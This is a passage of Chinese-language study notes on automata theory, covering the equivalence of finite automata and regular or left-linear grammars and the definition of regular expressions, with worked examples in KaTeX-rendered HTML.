/></p><blockquote><p>这里你可能已经忘记正则语言的定义了，正则语言是正则文法，即3型文法产生出的语言。3型文法有3个特点，首先产生式右侧的长度大于等于左侧的长度（确保是一个1型文法），然后产生式左侧一定是语法变量，而且一定是一个，不能多也不能少（确保是一个2型文法）。然后产生式右侧最好就只有终结符，如果有语法变量的话，只能出现在最后。</p></blockquote><h3 id="从fa得到等价的正则文法的例子1"><a class="markdownIt-Anchor" href="#从fa得到等价的正则文法的例子1"></a> 从FA得到等价的正则文法的例子1</h3><p><img src="https://upyun.wuuconix.link/image-20211109232511327.png" alt="例子" /></p><p>我们可以看到，文法的产生式实际上就是去看这个DFA的图。比如<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>q</mi><mi>s</mi></msub></mrow><annotation encoding="application/x-tex">q_s</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">s</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>有两条路径，分别为接收0后转化为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>q</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">q_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，和接收1后转化为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>q</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">q_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>。所以就可以写出产生式<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>q</mi><mi>s</mi></msub><mo>→</mo><mn>0</mn><msub><mi>q</mi><mn>0</mn></msub><mi mathvariant="normal">∣</mi><mn>1</mn><msub><mi>q</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">q_s \rightarrow0q_0|1q_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">s</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">0</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord">1</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>。然后因为接收0后转到的<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>q</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">q_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>是一个终结状态，所以还需要把<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>q</mi><mi>s</mi></msub><mo>→</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">q_s\rightarrow 0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">s</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span>加入产生式。故最后的产生式就是<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>q</mi><mi>s</mi></msub><mo>→</mo><mn>0</mn><msub><mi>q</mi><mn>0</mn></msub><mi mathvariant="normal">∣</mi><mn>1</mn><msub><mi>q</mi><mn>1</mn></msub><mi mathvariant="normal">∣</mi><mn>0</mn></mrow><annotation encoding="application/x-tex">q_s \rightarrow0q_0|1q_1|0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">s</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">0</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord">1</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord">0</span></span></span></span>。</p><h3 id="从fa得到等价的正则文法的例子2"><a class="markdownIt-Anchor" href="#从fa得到等价的正则文法的例子2"></a> 从FA得到等价的正则文法的例子2</h3><p><img src="https://upyun.wuuconix.link/image-20211109233210939.png" alt="例子2" /></p><p>相信你已经能很快写出了DFA等价的正则文法了。在这个例子中由于陷阱状态<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>q</mi><mi>t</mi></msub></mrow><annotation encoding="application/x-tex">q_t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2805559999999999em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>对语言没有贡献，可以进行简化，实际上就是把所有有<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>q</mi><mi>t</mi></msub></mrow><annotation encoding="application/x-tex">q_t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2805559999999999em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>的地方进行删除。</p><h3 id="定理3-4"><a class="markdownIt-Anchor" href="#定理3-4"></a> 定理3-4</h3><p>正则语言可以由FA接受。</p><p><img src="https://upyun.wuuconix.link/image-20211109233353850.png" alt="定理" /></p><p><img src="https://upyun.wuuconix.link/image-20211109233619563.png" alt="构造" /></p><h3 id="给定正则文法求等价fa的例子"><a class="markdownIt-Anchor" href="#给定正则文法求等价fa的例子"></a> 给定正则文法求等价FA的例子</h3><p><img src="https://upyun.wuuconix.link/image-20211109234137507.png" alt="例子" /></p><p>直接看答案应该能够很容易理解。如果产生式中有终结符，那么转移符号中需要写Z。</p><h3 id="推论3-1-fa与正则文法等价"><a class="markdownIt-Anchor" href="#推论3-1-fa与正则文法等价"></a> 推论3-1 FA与正则文法等价</h3><p>通过定理3-3和定理3-4就可以得到。</p><blockquote><p>给定一个FA就能求出一个等价的正则文法。</p><p>给定一个正则文法就能求出等价的FA</p></blockquote><h3 id="fa与左线性文法"><a class="markdownIt-Anchor" href="#fa与左线性文法"></a> FA与左线性文法</h3><p>之前讲的正则文法实际上是右线性文法，因为正则文法的产生式右侧的语法变量是在最右边的。</p><p>而如果产生式右侧的语法变量在最左侧，那就是左线性文法了。它和FA有什么关系呢？</p><p><img src="https://upyun.wuuconix.link/image-20211109235025032.png" alt="规约" /></p><p><img src="https://upyun.wuuconix.link/image-20211109235039291.png" alt="左线性文法与FA的关系" /></p><p>因为左线性文法利用了规约，所以对应对应出来的FA就像反了一样。</p><p>FA的起点实际上是左线性文法的终点。FA的终点实际上是左线性文法的起点。FA过了一遍，让一个语言从终结符号们变成了开始符号。实际上这就是规约的过程。</p><p><img src="https://upyun.wuuconix.link/image-20211109235342667.png" alt="FA与左线性文法的对应关系" /></p><p><img src="https://upyun.wuuconix.link/image-20211109235437563.png" alt="构造" /></p><p><img src="https://upyun.wuuconix.link/image-20211109235458214.png" alt="过程1" /></p><p><img src="https://upyun.wuuconix.link/image-20211109235516247.png" alt="预处理" /></p><h3 id="定理3-5"><a class="markdownIt-Anchor" href="#定理3-5"></a> 定理3-5</h3><p>左线性文法和FA等价</p><h2 id="第四章正则表达式"><a class="markdownIt-Anchor" href="#第四章正则表达式"></a> 第四章——正则表达式</h2><p>正则文法擅长语言的产生。有穷状态自动机擅长语言的识别。</p><p>这里又有一个新的概念，正则表达式，它不是文法也不是有穷状态自动机，它是对正则语言的一种描述。它非常简洁，也更加像语言。</p><h3 id="定义-2"><a class="markdownIt-Anchor" href="#定义-2"></a> 定义</h3><p>正则表达式 regular expression RE</p><ol><li><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>ϕ</mi></mrow><annotation encoding="application/x-tex">\phi</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">ϕ</span></span></span></span>是<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>∑</mo></mrow><annotation encoding="application/x-tex">\sum</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.00001em;vertical-align:-0.25001em;"></span><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span></span></span></span>的RE，它表示语言<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>ϕ</mi></mrow><annotation encoding="application/x-tex">\phi</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">ϕ</span></span></span></span></p></li><li><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">\epsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">ϵ</span></span></span></span>是<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>∑</mo></mrow><annotation encoding="application/x-tex">\sum</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.00001em;vertical-align:-0.25001em;"></span><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span></span></span></span>的RE，它表示语言<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">{</mo><mi>ϵ</mi><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">\{\epsilon\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord mathdefault">ϵ</span><span class="mclose">}</span></span></span></span></p><blockquote><p>从以上两个定义我们也回顾到一个事实，语言是一个集合</p></blockquote></li><li><p>对于<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">∀</mi><mi>a</mi><mo>∈</mo><mo>∑</mo></mrow><annotation encoding="application/x-tex">\forall a\in \sum</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.73354em;vertical-align:-0.0391em;"></span><span class="mord">∀</span><span class="mord mathdefault">a</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.00001em;vertical-align:-0.25001em;"></span><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span></span></span></span>，a是<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>∑</mo></mrow><annotation encoding="application/x-tex">\sum</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.00001em;vertical-align:-0.25001em;"></span><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span></span></span></span>上的RE，它表示语言<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">{</mo><mi>a</mi><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">\{a\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord mathdefault">a</span><span class="mclose">}</span></span></span></span></p></li><li><p>如果r和s分别是<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>∑</mo></mrow><annotation encoding="application/x-tex">\sum</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.00001em;vertical-align:-0.25001em;"></span><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span></span></span></span>上表示语言R和S的RE，则</p><p>r与s的和 (r+s)是<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>∑</mo></mrow><annotation encoding="application/x-tex">\sum</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.00001em;vertical-align:-0.25001em;"></span><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span></span></span></span>上的RE，(r+s)表示的语言为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>R</mi><mo>∪</mo><mi>S</mi></mrow><annotation encoding="application/x-tex">R\cup S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∪</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span></span></span></span></p><p>r与s的乘积 (rs) 是<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>∑</mo></mrow><annotation encoding="application/x-tex">\sum</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.00001em;vertical-align:-0.25001em;"></span><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span></span></span></span>上的RE，(rs)表达的语言为RS</p><p>r的克林闭包<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><msup><mi>r</mi><mo>∗</mo></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(r^*)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.688696em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>是<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>∑</mo></mrow><annotation encoding="application/x-tex">\sum</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.00001em;vertical-align:-0.25001em;"></span><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span></span></span></span>上的RE，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><msup><mi>r</mi><mo>∗</mo></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(r^*)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.688696em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>表达的语言为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>R</mi><mo>∗</mo></msup></mrow><annotation encoding="application/x-tex">R^*</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.688696em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.688696em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span></span></span></span></p></li><li><p>只有满足1，2，3，4的才是<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>∑</mo></mrow><annotation encoding="application/x-tex">\sum</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.00001em;vertical-align:-0.25001em;"></span><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span></span></span></span>上的RE</p></li></ol><h3 id="例子"><a class="markdownIt-Anchor" href="#例子"></a> 例子</h3><p>设<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>∑</mo><mo>=</mo><mo stretchy="false">{</mo><mn>0</mn><mo separator="true">,</mo><mn>1</mn><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">\sum=\{0,1\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.00001em;vertical-align:-0.25001em;"></span><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mclose">}</span></span></span></span></p><ol><li><p>0  表示语言<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">{</mo><mn>0</mn><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">\{0\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord">0</span><span class="mclose">}</span></span></span></span></p></li><li><p>1 表示语言 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">{</mo><mn>1</mn><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">\{1\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord">1</span><span class="mclose">}</span></span></span></span></p></li><li><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><mn>0</mn><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(0+1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span>表示语言<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">{</mo><mn>0</mn><mo separator="true">,</mo><mn>1</mn><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">\{0,1\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mclose">}</span></span></span></span></p><blockquote><p>语言<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">{</mo><mn>0</mn><mo separator="true">,</mo><mn>1</mn><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">\{0,1\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mclose">}</span></span></span></span>表示这个语言中有两个合法句子（不考虑空串），分别为0和1。</p></blockquote></li><li><p>(01) 表示语言<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">{</mo><mn>01</mn><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">\{01\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord">0</span><span class="mord">1</span><span class="mclose">}</span></span></span></span></p></li><li><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><mo stretchy="false">(</mo><mn>0</mn><mo>+</mo><mn>1</mn><msup><mo stretchy="false">)</mo><mo>∗</mo></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">((0+1)^*)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mopen">(</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.688696em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span> 表示语言<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">{</mo><mn>0</mn><mo separator="true">,</mo><mn>1</mn><msup><mo stretchy="false">}</mo><mo>∗</mo></msup></mrow><annotation encoding="application/x-tex">\{0,1\}^*</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mclose"><span class="mclose">}</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.688696em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span></span></span></span></p></li><li><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><mo stretchy="false">(</mo><mn>00</mn><mo stretchy="false">)</mo><mo stretchy="false">(</mo><mo stretchy="false">(</mo><mn>00</mn><msup><mo stretchy="false">)</mo><mo>∗</mo></msup><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">((00)((00)^*))</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mopen">(</span><span class="mord">0</span><span class="mord">0</span><span class="mclose">)</span><span class="mopen">(</span><span class="mopen">(</span><span class="mord">0</span><span class="mord">0</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.688696em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mclose">)</span></span></span></span> 表示语言<span class="katex"><span 